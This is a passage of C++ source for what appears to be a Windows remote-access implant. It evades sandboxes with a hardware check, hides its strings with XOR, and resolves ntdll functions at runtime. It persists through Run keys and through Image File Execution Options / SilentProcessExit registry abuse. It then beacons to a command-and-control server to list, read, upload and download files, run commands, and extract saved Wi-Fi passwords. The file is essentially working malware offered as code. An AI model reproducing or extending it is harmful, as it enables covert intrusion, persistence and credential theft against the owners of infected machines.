    MEMORYSTATUSEX mem_stat;
    mem_stat.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemStatus(&mem_stat);
    DWORD ram = mem_stat.ullTotalPhys / (1024 * 2);
    if (ram < 2048) return false;

    return true;

}


int init_functions() { // close handle

    /* compile time encryption and runtime decryption routine */
    constexpr auto enc_kdll = xor_stream<wchar_t, 13, 'f'>(L"kernel32.dll");
    std::wstring kernel_dll = runtime_decryptW(enc_kdll.data, 'f', 13);


    constexpr auto enc_ntdll = xor_stream<wchar_t, 10, 'c'>(L"NtDll.dll");
    std::wstring nt_dll = runtime_decryptW(enc_ntdll.data, 'c', 10);

    constexpr auto mod_str = xor_stream<char, 17, 'g'>("GetModuleHandleW");
    constexpr auto proc_str = xor_stream<char, 15, 'f'>("GetProcAddress");
    constexpr auto rtluni_str = xor_stream<char, 23, 'k'>("RtlCreateUnicodeString");
    constexpr auto ntcreate_str = xor_stream<char, 12, 'v'>("NtCreateKey");
    constexpr auto ntset_str = xor_stream<char, 14, 'l'>("NtSetValueKey");
    constexpr auto ntopen_str = xor_stream<char, 10, 'z'>("NtOpenKey");
    constexpr auto ntquery_str = xor_stream<char, 16, 'u'>("NtQueryValueKey");
    constexpr auto sysinfo_str = xor_stream<char, 14, 'p'>("GetSystemInfo");
    constexpr auto glob_mem_str = xor_stream<char, 21, 'l'>("GlobalMemoryStatusEx");
    constexpr auto create_proc_str = xor_stream<char, 15, 'x'>("CreateProcessA");

    PIMAGE_DOS_HEADER dos_hdr = get_module_hdr((PWSTR)kernel_dll.c_str());
    GetModHandleW = (GetModuleSig)get_func_addr(dos_hdr, runtime_decryptA(mod_str.data, 'g', 17).c_str(), 17);
    if (GetModHandleW == nullptr) return 1;

    GetProcAddr = (GetProcSig)get_func_addr(dos_hdr, runtime_decryptA(proc_str.data, 'f', 15).c_str(), 15);
    if (GetProcAddr == nullptr) return 1;

    CreateProcA = (CreateProcSig)get_func_addr(dos_hdr, runtime_decryptA(create_proc_str.data, 'x', 15).c_str(), 15);


    GetSysInfo = (GetSysSig)get_func_addr(dos_hdr, runtime_decryptA(sysinfo_str.data, 'p', 14).c_str(), 14);
    GlobalMemStatus = (GlobStatusSig)get_func_addr(dos_hdr, runtime_decryptA(glob_mem_str.data, 'l', 21).c_str(), 21);

    HMODULE ntHandle = GetModHandleW(nt_dll.c_str());

    RtlCreateUnicode = (RtlUnicodeStrSig)GetProcAddr(ntHandle, runtime_decryptA(rtluni_str.data, 'k', 23).c_str());
    if (!RtlCreateUnicode) return 1;

    NtCreateRegKey = (NtCreateKSig)GetProcAddr(ntHandle, runtime_decryptA(ntcreate_str.data, 'v', 12).c_str());
    if (!NtCreateRegKey) return 1;

    NtSetKeyVal = (NtSetValSig)GetProcAddr(ntHandle, runtime_decryptA(ntset_str.data, 'l', 14).c_str());
    if (!NtSetKeyVal) return 1;

    NtOpenRegKey = (NtOpenKSig)GetProcAddr(ntHandle, runtime_decryptA(ntopen_str.data, 'z', 10).c_str());
    if (!NtOpenRegKey) return 1;

    NtQueryRegKey = (NtQueryKSig)GetProcAddr(ntHandle, runtime_decryptA(ntquery_str.data, 'u', 16).c_str());
    if (!NtQueryRegKey) return 1;

    CloseHandle(ntHandle);

    

    return 0;

}

void write_to_registry(PWSTR key_path, PWSTR value, PWSTR name, DWORD val_sz) {
    HANDLE k_handle;

    bool isSuccess;
    ULONG regSz = 0;

    UNICODE_STRING data_obj = { 0 };
    UNICODE_STRING val_name = { 0 };
    UNICODE_STRING val_obj = { 0 };
    OBJECT_ATTRIBUTES att_obj = { 0 };

    NTSTATUS nt_stat;

    isSuccess = RtlCreateUnicode(&data_obj, key_path);
    if (!isSuccess) {
        return;
    }
    isSuccess = RtlCreateUnicode(&val_name, name);
    if (!isSuccess) {
        return;
    }

    InitializeObjectAttributes(&att_obj, &data_obj, OBJ_CASE_INSENSITIVE, NULL, NULL);
    nt_stat = NtOpenRegKey(&k_handle, KEY_ALL_ACCESS, &att_obj);

    nt_stat = NtSetKeyVal(k_handle, &val_name, 0, REG_SZ, value, val_sz);
    if (!NT_SUCCESS(nt_stat)) {
        return;
    }

    CloseHandle(k_handle);
}



//int main()
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    if (init_functions()) {
        send_results(ip, port, results_uri, "failed to initialize functions", 31);
        return 1;
    }

    if (!hardware_check()) exit(EXIT_SUCCESS);


    DWORD retryTime = 10000;
    DWORD timeToWait = 3000;

    u_char* cRawResponse;
    BOOL isAdmin = false;

    DWORD cSz = MAX_COMPUTERNAME_LENGTH + 1;

    char comp_post[MAX_COMPUTERNAME_LENGTH + 1 + 5] = "comp=";
    char comp_name[MAX_COMPUTERNAME_LENGTH + 1];

    wchar_t user_sid[MAX_SID_SIZE];
    wchar_t reg_agent_name[AGENTLEN+1];

    int reg_key_exists = 1;
    int r_flag1 = 512;
    int r_flag2 = 1;

    wchar_t exe_path[MAX_PATH];
    DWORD exe_sz = 0;

    std::wstring w_agent_name;
    std::wstring w_enc_key;

 
    constexpr auto hklm_enc = xor_stream<wchar_t, 18, 't'>(L"\\REGISTRY\\MACHINE");
    std::wstring reg_hklm = runtime_decryptW(hklm_enc.data, 't', 18);
    
    constexpr auto cv_enc = xor_stream<wchar_t, 47, 'j'>(L"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\");
    std::wstring reg_cv = runtime_decryptW(cv_enc.data, 'j', 47);

    constexpr auto pers1_enc = xor_stream<wchar_t, 47, 'c'>(L"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    std::wstring pers_key_s1 = runtime_decryptW(pers1_enc.data, 'c', 47);

    constexpr auto s1_enc = xor_stream<wchar_t, 16, 'n'>(L"\\Registry\\User\\");
    std::wstring reg_key_s1 = runtime_decryptW(s1_enc.data, 'n', 16);

    constexpr auto s2_enc = xor_stream<wchar_t, 24, 'm'>(L"\\SOFTWARE\\WininitConfig");
    std::wstring reg_key_s2 = runtime_decryptW(s2_enc.data, 'm', 24);

    std::wstring reg_key_path;
    std::wstring reg_key_path2;

    unsigned long enc_key;
    size_t comp_sz;
    //* Get Auth info */
    if (get_auth_info((wchar_t*)user_sid, &isAdmin)) {
        send_results(ip, port, results_uri, "Authentication function failed", 31);
    }
    reg_key_path = reg_key_s1 + std::wstring(user_sid) + reg_key_s2;
    reg_key_path2 = reg_key_s1 + std::wstring(user_sid) + pers_key_s1;
    

    /* PERSISTENCE MECHANISMS */
    GetModuleFileNameW(NULL, exe_path, MAX_PATH);
    exe_sz = wcsnlen_s(exe_path, MAX_PATH) * WCHARSZ;

    constexpr auto val_name_enc = xor_stream<wchar_t, 15, 'o'>(L"WininitMonitor");
    std::wstring val_name = runtime_decryptW(val_name_enc.data, 'o', 15);

    if (isAdmin) {
        constexpr auto file_exe_enc = xor_stream<wchar_t, 30, 'v'>(L"Image File Execution Options\\");
        constexpr auto silent_proc_enc = xor_stream<wchar_t, 19, 'd'>(L"SilentProcessExit\\");
        
        constexpr auto global_f_enc = xor_stream<wchar_t, 11, 'x'>(L"GlobalFlag");
        std::wstring global_flag = runtime_decryptW(global_f_enc.data, 'x', 11);
       

        constexpr auto mode_enc = xor_stream<wchar_t, 14, 'i'>(L"ReportingMode");
        std::wstring report_mode = runtime_decryptW(mode_enc.data, 'i', 14);
        

        constexpr auto mon_enc = xor_stream<wchar_t, 15, 'r'>(L"MonitorProcess");
        std::wstring mon_proc = runtime_decryptW(mon_enc.data, 'r', 15);

        std::wstring reg_write = reg_hklm + pers_key_s1;
        

        std::wstring silent_exe_pers1 = reg_hklm + reg_cv + runtime_decryptW(file_exe_enc.data, 'v', 30);

        std::wstring silent_exe_pers2 = reg_hklm + reg_cv + runtime_decryptW(silent_proc_enc.data, 'd', 19);

        if (writeToRun) {
            write_to_registry((PWSTR)reg_write.c_str(), exe_path, (PWSTR)val_name.c_str(), exe_sz);
        }


        for (std::wstring exe : silent_exe_apps) {
            std::wstring path = silent_exe_pers1 + exe;
            std::wstring path2 = silent_exe_pers2 + exe;

            s_key_store(&r_flag1, path.c_str(), sizeof(int), (PWSTR)global_flag.c_str(), REG_DWORD);
            s_key_store(&r_flag2, path2.c_str(), sizeof(int), (PWSTR)report_mode.c_str(), REG_DWORD);
            s_key_store(exe_path, path2.c_str(), exe_sz, (PWSTR)mon_proc.c_str(), REG_SZ);

        }
    }
    else {
        write_to_registry((PWSTR)reg_key_path2.c_str(), exe_path, (PWSTR)val_name.c_str(), exe_sz);
    }

    
    if (!GetComputerNameA(comp_name, &cSz)) strncpy_s(comp_name, "None", 5);
    comp_sz = strnlen_s(comp_name, cSz);
    strncat_s(comp_post, comp_name, cSz);
    
    s_get_agent_name((PWSTR)reg_key_path.c_str(), &reg_key_exists, reg_agent_name);

    if (!reg_key_exists) {
        constexpr auto reg_enc = xor_stream<wchar_t, 5, 'p'>(L"/reg");
        constexpr auto proc_enc = xor_stream<wchar_t, 12, 'd'>(L"ProcessSeed");

        w_agent_name = register_agent(ip, port, runtime_decryptW(reg_enc.data, 'p', 5).c_str(), comp_post, (MAX_COMPUTERNAME_LENGTH + 6));
        s_key_store((PWSTR)w_agent_name.c_str(), reg_key_path.c_str(), AGENTLEN * WCHARSZ, (PWSTR)runtime_decryptW(proc_enc.data, 'd', 12).c_str(), REG_SZ);

    }
    else {
        reg_agent_name[AGENTLEN] = '\0';
        w_agent_name = std::wstring(reg_agent_name);
    }

    constexpr auto res_enc = xor_stream<wchar_t, 9, 'f'>(L"/results");
    constexpr auto get_file_enc = xor_stream<wchar_t, 9, 'k'>(L"/getfile");
    
    wtask_uri += w_agent_name;
    wresults_uri += (w_agent_name + runtime_decryptW(res_enc.data, 'f', 9));
    wfileURI += (w_agent_name + runtime_decryptW(get_file_enc.data, 'k', 9));

    task_uri = (wchar_t*)wtask_uri.c_str();
    results_uri = (wchar_t*)wresults_uri.c_str();
    file_uri = (wchar_t*)wfileURI.c_str();

    w_enc_key = w_agent_name.substr(6, 12);

    enc_key = wcstol(w_enc_key.c_str(), 0, 10);
    get_enc_array(enc_key, testKey);


    while (true) {

        cRawResponse = beacon_c2(ip, port, task_uri, L"GET");
        u_char* argLine = (u_char*)"\x0a";
        char* argument = (char*)"\\";
        size_t aSz = 0;


        while (!cRawResponse) {
            Sleep(retryTime);
            cRawResponse = beacon_c2(ip, port, task_uri, L"GET");
        }
        if (isDecrypted) {
            dyn_data_encryption(testKey, cRawResponse, dataMax);
        }
        struct payloadLine* pLine = (struct payloadLine*)cRawResponse;
        if (!(pLine->type >= get_exe_dir && pLine->type < upload)) {
            argLine = cRawResponse + sizeof(payloadLine) + sizeof('\n');
            fix_string(argLine);
            aSz = uchar_strlen(argLine, dataMax);
            argument = (char*)malloc(aSz + 1);
            if (!argument) {
                send_results(ip, port, results_uri, "Failed to allocate memory for argument", 39);
                return 1;
            }
            if (uchar_to_char(argument, argLine, aSz + 1)) {
                send_results(ip, port, results_uri, "Failed u_char conversion", 25);
            }
        }
        if (!(int)pLine->getResult) {
            if (pLine->type == dir) {
                std::string dirBuff = "";
                std::string sDirName(argument);
                perform_dir(sDirName, &dirBuff);
                send_results(ip, port, results_uri, dirBuff.c_str(), dirBuff.size());
            }
            else if (pLine->type == view) {
                if (cat_file(argument)) {
                    send_results(ip, port, results_uri, "Failed to send data", 20);
                }
            }
            else if (pLine->type == download) {
                send_download(argument);
            }
            else if (pLine->type == get_exe_dir) {
                char filePath[MAX_PATH];
                getExeDir(filePath);
                send_results(ip, port, results_uri, filePath, strnlen(filePath, MAX_PATH));
            }
            else if (pLine->type == upload) {

                recv_upload(argument);
                send_results(ip, port, results_uri, "File received", 14);
            }
            else if (pLine->type == execute) {
                if (execute_f(argument)) send_results(ip, port, results_uri, "Failed to spawn", 16);
                send_results(ip, port, results_uri, "SUCCESS", 8);
            }

            else if (pLine->type == get_all) {
                get_network_info(true, false, false, NULL);
            }
            else if (pLine->type == get_names) {
                get_network_info(false, true, false, NULL);
            }
            else if (pLine->type == get_n_pass) {
                wchar_t* wifiName;
                cstr_to_wstr(argument, &wifiName, WLAN_MAX_NAME_LENGTH);
                get_network_info(false, false, true, wifiName);
            }
            else if (pLine->type == change_time) {
                char* pEnd;
                timeToWait = strtol(argument, &pEnd, 10);

            }
        }
        Sleep(timeToWait);
        if (!(pLine->type >= get_exe_dir && pLine->type < upload)) {
            free(argument);
        }
        free(cRawResponse);
    }
    return EXIT_SUCCESS;
}
